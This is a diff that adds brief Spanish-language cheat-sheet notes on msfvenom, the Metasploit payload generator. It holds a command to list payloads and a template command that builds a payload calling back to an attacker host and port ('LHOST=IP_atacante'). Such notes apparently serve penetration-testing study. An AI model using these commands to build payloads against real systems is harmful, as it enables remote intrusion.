@@ -1,1 +1,8 @@
+Listar payloads:
+
+msfvenom -l payloads
+
+
+crear un payload:
+msfvenom -p PAYLOAD LHOST=IP_atacante LPORT=PUERTO -f formato_del_archivo > archivo
 
